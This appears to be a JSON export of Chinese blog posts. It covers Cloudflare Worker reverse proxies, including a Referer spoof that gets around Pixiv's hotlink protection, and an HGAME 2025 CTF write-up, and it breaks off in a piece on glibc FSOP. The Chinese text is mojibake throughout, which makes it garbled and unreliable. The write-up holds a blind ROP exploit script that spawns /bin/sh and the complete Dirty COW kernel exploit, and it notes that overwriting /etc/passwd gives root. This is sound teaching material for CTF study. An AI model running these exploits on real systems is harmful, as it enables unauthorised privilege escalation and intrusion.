æ˜¯æŒ‡ä»£ç†æœåŠ¡å™¨å‘æœåŠ¡å™¨è½¬äº¤è¯·æ±‚ï¼Œå¹¶è¿”å›å†…å®¹ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°†å…¶è®¤ä¸ºæ˜¯åŸå§‹æœåŠ¡å™¨ã€‚\n\n\nA proxy server connecting the Internet to\nan internal network.\n\næ­å»ºåå‘ä»£ç†æœåŠ¡\nåˆ›å»ºå›¾åºŠä»“åº“\nåœ¨ GitHub ä¸­åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œå¯ä»¥é€‰æ‹©æ˜¯å¦æ˜¯ç§å¯†çš„ã€‚\n\nåœ¨ Personal Access\nTokens (Classic) å¤„åˆ›å»ºä¸€ä¸ªæ–°çš„ tokenï¼Œå‹¾é€‰ repo\nä¸‹æ‰€æœ‰æƒé™ã€‚\n\nè¿‡æœŸæ—¶é—´æˆ‘å·æ‡’é€‰äº†æ°¸ä¸è¿‡æœŸï¼Œä¸è¿‡è¿™æ ·è‚¯å®šä¼šå¯¼è‡´å®‰å…¨æ€§é™ä½çš„ã€‚ç”Ÿæˆ token åæ”¾åœ¨å®‰å…¨çš„åœ°æ–¹ï¼Œåˆ·æ–°åå°±çœ‹ä¸è§äº†ã€‚\né…ç½® Worker\nCloudflare\nWorkers\næä¾›äº†è¿™æ ·çš„æœåŠ¡ï¼Œä½†æ˜¯å…è´¹ä½¿ç”¨å…·æœ‰ä¸€å®šçš„è¯·æ±‚é™åˆ¶ã€‚åœ¨ä»ªè¡¨æ¿ä¸­æ·»åŠ ä¸€ä¸ª\nWorkerï¼Œè¿™é‡Œå‘½åä¸º assetsã€‚ä½¿ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\nconst upstream = \"raw.githubusercontent.com\";// Custom pathname for the upstream website.// (1) å¡«å†™ä»£ç†çš„è·¯å¾„ï¼Œæ ¼å¼ä¸º /&lt;ç”¨æˆ·&gt;/&lt;ä»“åº“å&gt;/&lt;åˆ†æ”¯&gt;const upstream_path = \"/avasummer/assets/main\";// github personal access token.// (2) å¡«å†™githubä»¤ç‰Œconst github_token = \"your_tokenhere\";// Website you intended to retrieve for users using mobile devices.const upstream_mobile = upstream;// Countries and regions where you wish to suspend your service.const blocked_region = [];// IP addresses which you wish to block from using your service.const blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];// Whether to use HTTPS protocol for upstream address.const https = true;// Whether to disable cache.const disable_cache = false;// Replace texts.const replace_dict = {  $upstream: \"$custom_domain\",};addEventListener(\"fetch\", (event) =&gt; {  event.respondWith(fetchAndApply(event.request));});async function fetchAndApply(request) {  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();  const ip_address = request.headers.get(\"cf-connecting-ip\");  const user_agent = request.headers.get(\"user-agent\");  let response = null;  let url = new URL(request.url);  let url_hostname = url.hostname;  if (https == true) {    url.protocol = \"https:\";  } else {    url.protocol = \"http:\";  }  if (await device_status(user_agent)) {    var upstream_domain = upstream;  } else {    var upstream_domain = upstream_mobile;  }  url.host = upstream_domain;  if (url.pathname == \"/\") {    url.pathname = upstream_path;  } else {    url.pathname = upstream_path + url.pathname;  }  if (blocked_region.includes(region)) {    response = new Response(      \"Access denied: WorkersProxy is not available in your region yet.\",      {        status: 403,      }    );  } else if (blocked_ip_address.includes(ip_address)) {    response = new Response(      \"Access denied: Your IP address is blocked by WorkersProxy.\",      {        status: 403,      }    );  } else {    let method = request.method;    let request_headers = request.headers;    let new_request_headers = new Headers(request_headers);    new_request_headers.set(\"Host\", upstream_domain);    new_request_headers.set(\"Referer\", url.protocol + \"//\" + url_hostname);    new_request_headers.set(\"Authorization\", \"token \" + github_token);    let original_response = await fetch(url.href, {      method: method,      headers: new_request_headers,      body: request.body,    });    connection_upgrade = new_request_headers.get(\"Upgrade\");    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {      return original_response;    }    let original_response_clone = original_response.clone();    let original_text = null;    let response_headers = original_response.headers;    let new_response_headers = new Headers(response_headers);    let status = original_response.status;    if (disable_cache) {      new_response_headers.set(\"Cache-Control\", \"no-store\");    } else {      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");    }    new_response_headers.set(\"access-control-allow-origin\", \"*\");    new_response_headers.set(\"access-control-allow-credentials\", true);    new_response_headers.delete(\"content-security-policy\");    new_response_headers.delete(\"content-security-policy-report-only\");    new_response_headers.delete(\"clear-site-data\");    if (new_response_headers.get(\"x-pjax-url\")) {      new_response_headers.set(        \"x-pjax-url\",        response_headers          .get(\"x-pjax-url\")          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)      );    }    const content_type = new_response_headers.get(\"content-type\");    if (      content_type != null &amp;&amp;      content_type.includes(\"text/html\") &amp;&amp;      content_type.includes(\"UTF-8\")    ) {      original_text = await replace_response_text(        original_response_clone,        upstream_domain,        url_hostname      );    } else {      original_text = original_response_clone.body;    }    response = new Response(original_text, {      status,      headers: new_response_headers,    });  }  return response;}async function replace_response_text(response, upstream_domain, host_name) {  let text = await response.text();  var i, j;  for (i in replace_dict) {    j = replace_dict[i];    if (i == \"$upstream\") {      i = upstream_domain;    } else if (i == \"$custom_domain\") {      i = host_name;    }    if (j == \"$upstream\") {      j = upstream_domain;    } else if (j == \"$custom_domain\") {      j = host_name;    }    let re = new RegExp(i, \"g\");    text = text.replace(re, j);  }  return text;}async function device_status(user_agent_info) {  var agents = [    \"Android\",    \"iPhone\",    \"SymbianOS\",    \"Windows Phone\",    \"iPad\",    \"iPod\",  ];  var flag = true;  for (var v = 0; v &lt; agents.length; v++) {    if (user_agent_info.indexOf(agents[v]) &gt; 0) {      flag = false;      break;    }  }  return flag;}\néƒ¨ç½² Workerï¼Œç„¶ååœ¨è®¾ç½® - åŸŸå’Œè·¯ç”±ä¸­æ·»åŠ è‡ªå®šä¹‰åŸŸï¼š\n\nç°åœ¨æ‚¨çš„å›¾åºŠåº”è¯¥å¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚\nhelloworld.jpg (300Ã—384): https://assets.summ2.link/helloworld.jpg\nå°å½©è›‹\nä¼—æ‰€å‘¨çŸ¥ï¼Œä¼¼ä¹åœ¨ 2020 å¹´å‰åï¼ŒPixiv\nå°±æ— æ³•è¢«ç›´æ¥è®¿é—®äº†ã€‚ä¸‹é¢å€Ÿæ­¤æœºä¼šï¼Œå°è¯•æ­å»ºä¸€ä¸ª Pixiv\nå›¾åºŠçš„åå‘ä»£ç†æœåŠ¡ã€‚ç”±äº i.pximg.net\nçš„ç›—é“¾ä¿æŠ¤ï¼Œå¾—æŠŠä¹‹å‰çš„ä»£ç åšä¸€äº›ä¿®æ”¹ã€‚\n// Website you intended to retrieve for users.const upstream = \"i.pximg.net\";// Website you intended to retrieve for users using mobile devices.const upstream_mobile = upstream;// Countries and regions where you wish to suspend your service.const blocked_region = [];// IP addresses which you wish to block from using your service.const blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];// Whether to use HTTPS protocol for upstream address.const https = true;// Whether to disable cache.const disable_cache = false;// Replace texts.const replace_dict = {  $upstream: \"$custom_domain\",};addEventListener(\"fetch\", (event) =&gt; {  event.respondWith(fetchAndApply(event.request));});async function fetchAndApply(request) {  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();  const ip_address = request.headers.get(\"cf-connecting-ip\");  const user_agent = request.headers.get(\"user-agent\");  let response = null;  let url = new URL(request.url);  let url_hostname = url.hostname;  if (https == true) {    url.protocol = \"https:\";  } else {    url.protocol = \"http:\";  }  if (await device_status(user_agent)) {    var upstream_domain = upstream;  } else {    var upstream_domain = upstream_mobile;  }  url.host = upstream_domain;/*  if (url.pathname == \"/\") {    url.pathname = upstream_path;  } else {    url.pathname = upstream_path + url.pathname;  }*/  if (blocked_region.includes(region)) {    response = new Response(      \"Access denied: WorkersProxy is not available in your region yet.\",      {        status: 403,      }    );  } else if (blocked_ip_address.includes(ip_address)) {    response = new Response(      \"Access denied: Your IP address is blocked by WorkersProxy.\",      {        status: 403,      }    );  } else {    let method = request.method;    let request_headers = request.headers;    let new_request_headers = new Headers(request_headers);    new_request_headers.set('Referer', 'https://www.pixiv.net/');    let original_response = await fetch(url.href, {      method: method,      headers: new_request_headers,      body: request.body,    });    connection_upgrade = new_request_headers.get(\"Upgrade\");    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {      return original_response;    }    let original_response_clone = original_response.clone();    let original_text = null;    let response_headers = original_response.headers;    let new_response_headers = new Headers(response_headers);    let status = original_response.status;    if (disable_cache) {      new_response_headers.set(\"Cache-Control\", \"no-store\");    } else {      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");    }    new_response_headers.set(\"access-control-allow-origin\", \"*\");    new_response_headers.set(\"access-control-allow-credentials\", true);    new_response_headers.delete(\"content-security-policy\");    new_response_headers.delete(\"content-security-policy-report-only\");    new_response_headers.delete(\"clear-site-data\");    if (new_response_headers.get(\"x-pjax-url\")) {      new_response_headers.set(        \"x-pjax-url\",        response_headers          .get(\"x-pjax-url\")          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)      );    }    const content_type = new_response_headers.get(\"content-type\");    if (      content_type != null &amp;&amp;      content_type.includes(\"text/html\") &amp;&amp;      content_type.includes(\"UTF-8\")    ) {      original_text = await replace_response_text(        original_response_clone,        upstream_domain,        url_hostname      );    } else {      original_text = original_response_clone.body;    }    response = new Response(original_text, {      status,      headers: new_response_headers,    });  }  return response;}async function replace_response_text(response, upstream_domain, host_name) {  let text = await response.text();  var i, j;  for (i in replace_dict) {    j = replace_dict[i];    if (i == \"$upstream\") {      i = upstream_domain;    } else if (i == \"$custom_domain\") {      i = host_name;    }    if (j == \"$upstream\") {      j = upstream_domain;    } else if (j == \"$custom_domain\") {      j = host_name;    }    let re = new RegExp(i, \"g\");    text = text.replace(re, j);  }  return text;}async function device_status(user_agent_info) {  var agents = [    \"Android\",    \"iPhone\",    \"SymbianOS\",    \"Windows Phone\",    \"iPad\",    \"iPod\",  ];  var flag = true;  for (var v = 0; v &lt; agents.length; v++) {    if (user_agent_info.indexOf(agents[v]) &gt; 0) {      flag = false;      break;    }  }  return flag;}\näº‹å®ä¸Šå®ç°åŸºæœ¬çš„åä»£åŠŸèƒ½ï¼Œåªéœ€è¦å¦‚ä¸‹ä»£ç ï¼š\nexport default {  async fetch(request) {    const url = new URL(request.url);    url.hostname = 'i.pximg.net';    const proxyRequest = new Request(url, request);    proxyRequest.headers.set('Referer', 'https://www.pixiv.net/');    return fetch(proxyRequest);  },};\néƒ¨ç½²åœ¨ pixiv.summ2.link ä¸Šï¼Œå®ƒå¯ä»¥æˆåŠŸé…ç½®åœ¨ PixEzï¼ˆä¸€ä¸ª Pixiv\nç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ï¼‰ä¸­ã€‚\nExample:\nhttps://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg\nå‚è€ƒ\n\n\n\nhttps://en.wikipedia.org/wiki/Proxy_serverâ†©ï¸\nhttps://en.wikipedia.org/wiki/Reverse_proxyâ†©ï¸\n\n\n","categories":["Web"],"tags":["Reverse Proxy"]},{"title":"HGAME 2025 Final å¤ç°","url":"/categories/CTF/hgame-2025-final/","content":"Backto2016\n\nä½†ä½ å¿…é¡»å…ˆå‘æˆ‘ä»¬è¯æ˜è‡ªå·±æœ‰å›åˆ° 2016 çš„å®åŠ›ï¼\nç¥ä½ ç©çš„å¼€å¿ƒ o (ï¿£â–½ï¿£) ãƒ–\næ²¡æœ‰é™„ä»¶æ˜¯æ­£å¸¸çš„å–µ\nè¿™ä¸ªåˆ†æ•°æˆ–è®¸ä¹Ÿè€ƒè™‘äº†ä¹° hint è¿™ä»¶äº‹ï¼Œåˆ«å®³æ€•å˜»å˜»\n\nè¿™é“é¢˜æ˜¯æ²¡æœ‰ç»™å‡ºé™„ä»¶çš„ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥å’Œç¨‹åºçš„è¾“å‡ºè·å–ä¸€åˆ‡ä¿¡æ¯ã€‚\n\n\nVulnerabilities\néšä¾¿è¾“å…¥ä¸€äº›å­—ç¬¦ä¼šå‘ç°ï¼Œç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œå‡ºé¢˜äººå¾ˆå‹å¥½åœ°æä¾›äº†ç¨‹åºå´©æºƒçš„æ›´å¤šä¿¡æ¯ï¼ˆ***\nstack smashing detected ***: terminatedï¼‰\nå­˜åœ¨ Canary ä¿æŠ¤ã€‚\n\næ³¨æ„åˆ°åœ¨äº¤äº’è¿›ç¨‹ç»“æŸåï¼Œä¼šä¿æŒè¿æ¥ï¼Œè¿”å›ä¸€ä¸ª PID+1 çš„æ–°è¿›ç¨‹ï¼Œè¿™æç¤ºæˆ‘ä»¬ç¨‹åºä½¿ç”¨ fork() å®ç°åŠŸèƒ½ã€‚\n\n\nèµ›åæ”¾å‡ºçš„æºç \n\nå› æ­¤ï¼Œå­è¿›ç¨‹çš„ Canary å€¼ä¸ä¼šæ”¹å˜ã€‚\nExploit\nä»é¢˜ç›®çš„æç¤ºå¯ä»¥çŸ¥é“ï¼Œå…¶å®è¿™æ˜¯ç±»ä¼¼äº HCTF2016 brop1 çš„ä¸€é“é¢˜ç›®ã€‚\nè¿ç”¨çš„æ”»å‡»æ–¹æ³•å«åš Blind Return Oriented Programming (BROP)2ã€‚\nBROP çš„ä¸»è¦æµç¨‹ï¼š\n\nç»•è¿‡ Canary å’Œ PIE çš„ä¿æŠ¤ï¼›\nå¯»æ‰¾ \"stop gadget\";\n å¯»æ‰¾æ§åˆ¶å¯„å­˜å™¨çš„ gadget;\ndump memory to get the binary\n è·å¾— libc baseï¼Œç„¶å get shell\n\nCanary bypass\nBROP é¦–å…ˆéœ€è¦æˆ‘ä»¬ç»•è¿‡ Canaryï¼š\n\n\nStack reading. A single byte on the stack\nis overwritten with guess X. If the service crashes, the wrong value was\nguessed.\n\nStop gadget\nStop gadget æŒ‡çš„æ˜¯å¯ä»¥å°†ç¨‹åºæŒ‚èµ·çš„ä¸€æ®µ gadgetã€‚\nä¸ºä»€ä¹ˆéœ€è¦ Stop gadget? å¦‚æœæˆ‘ä»¬å°† Return\naddress è¦†ç›–æˆéšæœºçš„æ•°æ®ï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡ä¼šå¼•å‘æ®µé”™è¯¯ã€‚è€Œ Stop\ngadget èƒ½è®©ç¨‹åºä¿æŒæ­£å¸¸è¿è¡Œï¼Œåœ¨å¯»æ‰¾å…¶ä»– gadget æ—¶èµ·åˆ°äº†åŒºåˆ†ä½œç”¨ã€‚\n\n\nstop gadget is useful!\n\nå½“æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†ä¸€ä¸ª gadgetï¼Œ$rsp è¿›å…¥å¯„å­˜å™¨ï¼Œç¨‹åºè¿›å…¥ $rsp+8&lt;stop_gadget&gt;ã€‚\nå¦‚æœè¿˜æœªæ‰¾åˆ°è¿™ä¸ª gadgetï¼Œç¨‹åºä¼šç›´æ¥å‘ç”Ÿæ®µé”™è¯¯ã€‚è¿™ä¸ªä½œç”¨åœ¨ä¸‹ä¸€èŠ‚ä¼šæ›´å…·ä½“åœ°ä½“ç°ã€‚\nCommon gadget\nåœ¨ Ubuntu\n14.04 ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¾ˆå¥½çš„å‡½æ•°__libc_csu_init()ï¼Œé‡Œé¢å­˜åœ¨æ§åˆ¶ä¼ å‚å¯„å­˜å™¨çš„ gadgetï¼Œå…·ä½“è¯·å‚è€ƒé€šç”¨\ngadgetã€‚\n0x000000000040082a &lt;+90&gt;:    5b      pop    rbx0x000000000040082b &lt;+91&gt;:    5d      pop    rbp0x000000000040082c &lt;+92&gt;:    41 5c   pop    r120x000000000040082e &lt;+94&gt;:    41 5d   pop    r130x0000000000400830 &lt;+96&gt;:    41 5e   pop    r140x0000000000400832 &lt;+98&gt;:    41 5f   pop    r150x0000000000400834 &lt;+100&gt;:   c3      ret\næ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å¸ƒç½®æ ˆæ•°æ®ï¼š\npayload = flat({    offset: [        canary,        p64(1),        p64(pop_gadget),        p64(0)*6,        p64(stop_gadget)        ]    })\nä½†æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªå°é—®é¢˜ï¼Œå¦‚æœéå†æ—¶ pop_gadget æ°å¥½æ˜¯å¦ä¸€ä¸ª stop\ngadgetï¼Œç¨‹åºä¹Ÿä¸ä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œå’Œæ‰§è¡Œåˆ°çœŸæ­£çš„ gadget å¤„ç»“æœä¸€æ ·ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›ä¸€æ­¥éªŒè¯ï¼Œå®ƒæ˜¯å¦æˆ‘ä»¬éœ€è¦çš„ã€‚\nåœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘æ‰¾åˆ°çš„ stop gadget ä¼šè¾“å‡ºä¸€äº›å›ºå®šå­—ç¬¦ï¼š\nif ( b\"killed by\" not in resp):    payload = flat({            offset: [                canary,                p64(1),                p64(pop_gadget)                ]            })            p.sendafter(\"password\",payload)            resp = p.recv()            resp = p.recv()            log.success(f\"stop_gadget[{i}] = {hex(stop_gadget)}\")            log.success(f\"pop_gadget[{i}] = {hex(pop_gadget)}\")            choose = input(\"Continue?\")            if(choose==\"y\" or choose==\"Y\"):continue            break\nè§‚å¯Ÿå›æ˜¾ï¼Œå¦‚æœæ²¡æœ‰è¾“å‡ºï¼Œé‚£ä¹ˆè¿™å¤§æ¦‚ç‡æ˜¯æ­£ç¡®çš„ã€‚å½“ç„¶åœ¨åç»­è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥æ›´ç¡®å®šè¿™ä¸ª gadget æ˜¯ä¸æ˜¯çœŸçš„ã€‚\nDump memory\nå¾—åˆ°éœ€è¦çš„ gadgetï¼Œå°±å¯ä»¥å¼€å§‹ dump memory äº†ã€‚\nä¸ºäº†æ‰¾åˆ° write() çš„ plt åœ°å€ï¼Œå¯ä»¥å°† $rdi èµ‹å€¼ 0x400000ï¼Œå³ write(0x400000)ï¼Œå¦‚æœåœ°å€æ­£ç¡®ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ° ELF å¤´å‡ ä¸ªå›ºå®šå­—ç¬¦ï¼š\\x7fELF\nwhile True:    put_addr += 1    payload = flat({    offset: [        canary,        p64(1),        p64(pop_gadget),        p64(0x400000),#pop rdi        p64(put_addr),        p64(stop_gadget)        ]    })    p.sendafter(\"password\",payload)    try:         resp = p.recv()        resp = p.recv()        if ( b\"\\x7fELF\" in resp):            log.success(f\"put found[{i}] = {hex(put_addr)}\")            choose = input(\"Continue?\")            if(choose==\"y\" or choose==\"Y\"):continue            break    except:        pass\n\nå›é¡¾ plt è¡¨çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå·²ç»è°ƒç”¨è¿‡çš„å‡½æ•°åœ°å€ä¼šè¢«ä¿å­˜åœ¨.got æ®µä¸­ã€‚\nGet shell\nåç»­è¿‡ç¨‹å°±æ¯”è¾ƒç®€å•äº†ï¼Œå†™ ROP é“¾å³å¯ã€‚\nstop_gadget=0x400700pop_gadget=0x400b2a+0x9put_addr = 0x400715got_addr = 0x602018payload = flat({      offset: [        canary,        p64(1),        p64(pop_gadget),        p64(got_addr),#pop rdi        p64(put_addr),    ]})p.sendafter(\"password:\\n\",payload)put_addr = u64(p.recv(6).ljust(8, b'\\x00'))log.success(hex(put_addr))libc_base = put_addr - libc.sym[\"puts\"]log.success(hex(libc_base))sys_addr = libc_base + libc.sym[\"system\"]binsh_addr = libc_base +next(libc.search(b\"/bin/sh\"))pause()payload = flat({      offset: [        canary,        p64(1),        p64(pop_gadget),        p64(binsh_addr),#pop rdi        p64(sys_addr),    ]})p.sendafter(\"password:\",payload)p.interactive()\nBackto2016(2)\nè¿™é¢˜èµ›æ—¶å¹¶æ²¡æœ‰åšå‡ºæ¥ï¼ˆè€Œä¸”é¶æœºè·‘çš„å¾ˆæ…¢ï¼Œçˆ†ç ´ä¸åŠ¨ï¼‰ï¼Œåé¢çœ‹äº† wp äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ª kernel\nvulnerabilityã€‚\nCopy On Write3\n\nCopy-on-write (COW), also called\nimplicit sharingor shadowing,is a resource-management\ntechnique used in programming\nto manage shared data efficiently. Instead of copying data right away\nwhen multiple programs use it, the same data is shared between programs\nuntil one tries to modify it. If no changes are made, no private copy is\ncreated, saving resources.\nA copy is only made when needed, ensuring each program has its own\nversion when modifications occur. This technique is commonly applied to\nmemory, files, and data structures.\n\nä¾‹å¦‚ fork() åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ç©ºé—´å’Œæ—¶é—´å¼€é”€ï¼Œä½¿ç”¨äº†å†™æ—¶å¤åˆ¶çš„ç­–ç•¥ã€‚\n\n\nTake a lot space and time\n\n\n\nCopy-on-write\n\nDirty-cow4\né€šè¿‡ mmap() æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜ï¼Œåˆ©ç”¨å†™æ—¶å¤åˆ¶ï¼Œ\nwrite å’Œ madvise() å¯¼è‡´çš„æ¡ä»¶ç«äº‰æ¼æ´ã€‚\nä¸‹é¢æ˜¯å®ƒçš„ä¸€ä¸ª POCï¼Œå¯å‚è§ï¼šhttps://github.com/dirtycow/dirtycow.github.io\n/*####################### dirtyc0w.c #######################$ sudo -s# echo this is not a test &gt; foo# chmod 0404 foo$ ls -lah foo-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foothis is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000mmap 56123000madvise 0procselfmem 1800000000$ cat foom00000000000000000####################### dirtyc0w.c #######################*/#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void *map;int f;struct stat st;char *name; void *madviseThread(void *arg){  char *str;  str=(char*)arg;  int i,c=0;  for(i=0;i&lt;100000000;i++)  {/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/    c+=madvise(map,100,MADV_DONTNEED);  }  printf(\"madvise %d\\n\\n\",c);} void *procselfmemThread(void *arg){  char *str;  str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt;  The in the wild exploit we are aware of doesn't work on Red Hat&gt;  Enterprise Linux 5 and 6 out of the box because on one side of&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not&gt;  writable on Red Hat Enterprise Linux 5 and 6.*/  int f=open(\"/proc/self/mem\",O_RDWR);  int i,c=0;  for(i=0;i&lt;100000000;i++) {/*You have to reset the file pointer to the memory position.*/    lseek(f,(uintptr_t) map,SEEK_SET);    c+=write(f,str,strlen(str));  }  printf(\"procselfmem %d\\n\\n\", c);}  int main(int argc,char *argv[]){/*You have to pass two arguments. File and Contents.*/  if (argc&lt;3) {  (void)fprintf(stderr, \"%s\\n\",      \"usage: dirtyc0w target_file new_content\");  return 1; }  pthread_t pth1,pth2;/*You have to open the file in read only mode.*/  f=open(argv[1],O_RDONLY);  fstat(f,&amp;st);  name=argv[1];/*You have to use MAP_PRIVATE for copy-on-write mapping.&gt; Create a private copy-on-write mapping.  Updates to the&gt; mapping are not visible to other processes mapping the same&gt; file, and are not carried through to the underlying file.  It&gt; is unspecified whether changes made to the file after the&gt; mmap() call are visible in the mapped region.*//*You have to open with PROT_READ.*/  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);/*You have to do it on two threads.*/  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);/*You have to wait for the threads to finish.*/  pthread_join(pth1,NULL);  pthread_join(pth2,NULL);  return 0;}\nä»¥ ~/foo ä¸ºä¾‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼š\n\n\nè¿è¡Œ dirtycowï¼š\n\nç»“æœå¦‚ä¸‹ï¼š\n\nåŒç†ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹ /etc/passwdï¼Œå°±å¯ä»¥å®ç°ææƒã€‚\nReferences\n\n\n\npwn_hctf2016_brop.mdâ†©ï¸\nbittau-brop.pdfâ†©ï¸\nCopy-on-writeâ†©ï¸\nDirty\nCOWâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","hgame","kernel","blind pwn"]},{"title":"Vidar åˆ†äº«ä¼š - FSOP","url":"/categories/CTF/vidarshare-fsop/","content":"I. FSOP\n\nFSOP æ˜¯ File Stream Oriented Programming çš„ç¼©å†™ã€‚\nFSOP çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ\n_IO_list_all çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„\n_IO_FILE é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚FSOP\né€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª\nFILE è°ƒç”¨\nfflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚\n\n\nII. RTFSC\nä¸‹é¢æˆ‘å°†ä»¥ glibc-2.39 æºç ä¸ºä¾‹ï¼Œåˆ†æ FSOP çš„ä¸€ä¸ªå®é™…åº”ç”¨ ---House of\nApple (2)1 æ¶‰åŠçš„åŸç†ã€‚\n_IO_FILE\n/libio/bits/types/struct_FILE.h ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š\nstruct _IO_FILE{  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;\t/* Current read pointer */  char *_IO_read_end;\t/* End of get area. */  char *_IO_read_base;\t/* Start of putback+get area. */  char *_IO_write_base;\t/* Start of put area. */  char *_IO_write_ptr;\t/* Current put pointer. */  char *_IO_write_end;\t/* End of put area. */  char *_IO_buf_base;\t/* Start of reserve area. */  char *_IO_buf_end;\t/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;  int _flags2;  __off_t _old_offset; /* This used to be _offset but it's too small.  */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{  struct _IO_FILE _file;#endif  __off64_t _offset;  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;  size_t __pad5;  int _mode;  /* Make sure we don't get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];};\nä½¿ç”¨ gdbï¼Œå¯ä»¥å¾—åˆ°å…¶æˆå‘˜çš„ç›¸å¯¹åç§»ï¼š\n\n\nimg\n\nExit () è°ƒç”¨è¿‡ç¨‹\n__run_exit_handlers()\nexit() åœ¨ /stdlib/exit.c æœ‰å®šä¹‰:\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pointer_guard.h&gt;#include &lt;libc-lock.h&gt;#include &lt;set-freeres.h&gt;#include \"exit.h\"/* Initialize the flag that indicates exit function processing   is complete. See concurrency notes in stdlib/exit.h where   __exit_funcs_lock is declared.  */bool __exit_funcs_done = false;/* Call all functions registered with `atexit' and `on_exit',   in the reverse of the order in which they were registered   perform stdio cleanup, and terminate program execution with STATUS.  */voidattribute_hidden__run_exit_handlers (int status, struct exit_function_list **listp,\t\t     bool run_list_atexit, bool run_dtors){  /* First, call the TLS destructors.  */  if (run_dtors)    call_function_static_weak (__call_tls_dtors);  __libc_lock_lock (__exit_funcs_lock);  /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit' and `on_exit'. We call     everyone on the list and use the status value in the last     exit (). */  while (true)    {      struct exit_function_list *cur;    restart:      cur = *listp;      if (cur == NULL)\t{\t  /* Exit processing complete.  We will not allow any more\t     atexit/on_exit registrations.  */\t  __exit_funcs_done = true;\t  break;\t}      while (cur-&gt;idx &gt; 0)\t{\t  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];\t  const uint64_t new_exitfn_called = __new_exitfn_called;\t  switch (f-&gt;flavor)\t    {\t      void (*atfct) (void);\t      void (*onfct) (int status, void *arg);\t      void (*cxafct) 